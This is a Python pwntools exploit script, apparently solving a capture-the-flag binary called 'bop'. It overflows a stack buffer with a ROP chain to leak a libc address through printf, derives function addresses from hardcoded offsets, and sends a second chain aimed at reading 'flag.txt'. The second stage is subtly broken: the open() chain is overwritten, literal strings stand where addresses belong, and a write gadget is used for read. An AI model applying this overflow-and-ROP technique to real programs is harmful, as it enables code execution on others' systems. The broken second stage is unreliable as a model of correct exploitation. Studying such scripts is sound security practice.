from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./bop")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}

#p = process("./bop")
#p = remote("localhost", 5000)
p = gdb.debug("./bop",'''
break *_start
break *0x4012f9
break *0x401359
break *0x401365
''')

# Gadgets
pop_rdi = 0x4013d3
pop_rsi = 0x4013d1 # rdi;r15
pop_rbp = 0x4011fd
ret = 0x40101a

# Functions
main = 0x4012f9
gets_plt = 0x40135e
gets_plt_got = 0x404040
printf_plt = 0x4010f0
printf_plt_got = 0x404038



# LIBC leak payload
payload = ""
payload += "A" * 40
payload += p64(pop_rdi)
payload += p64(gets_plt_got)
payload += p64(ret)
payload += p64(printf_plt)
payload += p64(ret)
payload += p64(main)

# 1st Payload for leaks
p.recv()
p.sendline(payload)

# LIBC & LIBSECCOMP leaks
libc_gets_leak = int(p.recv(8)[::-1].encode('hex'),16)
seccomp_open = libc_gets_leak + 566128
seccomp_read = libc_gets_leak + 566864
seccomp_write = libc_gets_leak + 567024

print "libc gets() leak: ", hex(libc_gets_leak)
print "lib_seccomp open() leak: ", hex(seccomp_open)
print "lib_seccomp read() leak: ", hex(seccomp_read)
print "lib_seccomp write() leak: ", hex(seccomp_write)

# open('flag.txt', 4)
# syscall rax=0x2, rdi='flag.txt', rsi=4
payload2 = ""
payload2 += "B" * 40
payload2 += p64(pop_rdi)
payload2 += 'flag.txt'
payload2 += p64(ret)
payload2 += p64(seccomp_open)
payload2 += p64(ret)

# read(int fd, void *buf, size_t count);
payload2 = ""
payload2 += "B" * 40
payload2 += p64(pop_rdi)
payload2 += 'flag.txt'
payload2 += p64(ret)
payload2 += p64(pop_rsi)
payload2 += '4'
payload2 += p64(seccomp_write)

#write(int fd, const void *buf, size_t count)

p.recv()
p.sendline(payload2)
p.interactive()

